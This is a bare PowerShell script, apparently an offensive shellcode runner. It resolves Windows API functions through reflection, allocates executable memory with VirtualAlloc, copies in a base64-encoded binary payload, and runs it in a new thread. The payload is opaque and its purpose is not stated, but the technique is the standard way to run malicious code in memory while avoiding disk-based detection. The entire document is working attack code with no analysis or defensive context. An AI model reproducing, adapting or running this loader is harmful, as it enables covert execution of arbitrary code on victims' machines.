function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)][Type] $delType = [Void]
    )
    
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
    [System.MulticastDelegate])
    
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', 
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
    @($moduleName)), $functionName))

}


$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc), 
    (getDelegateType @([IntPtr], [uint64], [uint64], [uint64]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = [System.Convert]::FromBase64String("TTHbVEFdZkGB5TD4Sb8sSTHrv53JJtn3QbM/SQ+uRQBJg8UISYt9AEn/y04xfN8fTYXbdfN4BAAG/sIS9mT0pM601XEo2iRXqj56ad5t/AmisDPOb6+OOaY0koDZ4QIAh1awhKPBPMI2q0TIF8dlnDckBZ+Rj7CmkyLwwB/H76s3lTjEnpCOFf1fnsgVb78UgVDasOrzkRT7SONyWX3vlzDhnLn55ma8QI0yNqM7+EpLw0aUY3UbrDDVUXCO+7i4+m8yxsB2ga2YSja84ElDg+OrluFnTimfmucgkQmcDZ8UM5cKItZsLmKon1jq0u2CUZjeGs/K7YMtk59mEGTCg1ero6ROGSMkwuHQObJR4ZFzWUJo5BmREldBm2vSGSuSKkGba5IZK7JiQR+O+Bvt8ftBIfkebcG8MCUweHOYrYEzyPLU4BDxiLlbMLLwbejB4oKQsbJRoIi3yWRe+lBwkLlBCH05EYCJM9nzb/quaYG5PZhxs4ft8ftBIfkeEGEJP0gR+Iqx1TF+ClwduhSZEUfRSH05EYSJM9l2eDld6IS5SQxws4HhSzaBWDhiEPiBaldJY/MJ4ZlzU1i6XnHhks3pSHjrC+hLIOBHxk2u/YiICBA5slGgwDJBnbSzUKDAc7Mhst3WXxWJ6Q0TuBAaZqe0jcZnGSMEGjUWRbjRWyBHDKt+oSPPqjJQUbBornWjU2VzF9cpxcCaNaR7kb47SuDTz8zXFikez/ffiPA=")
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread), 
    (getDelegateType @([IntPtr], [uint64], [IntPtr], [IntPtr], [uint64], [IntPtr]) ([IntPtr]))
).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
    
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject), 
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
).Invoke($hThread, 0xFFFFFFFF)

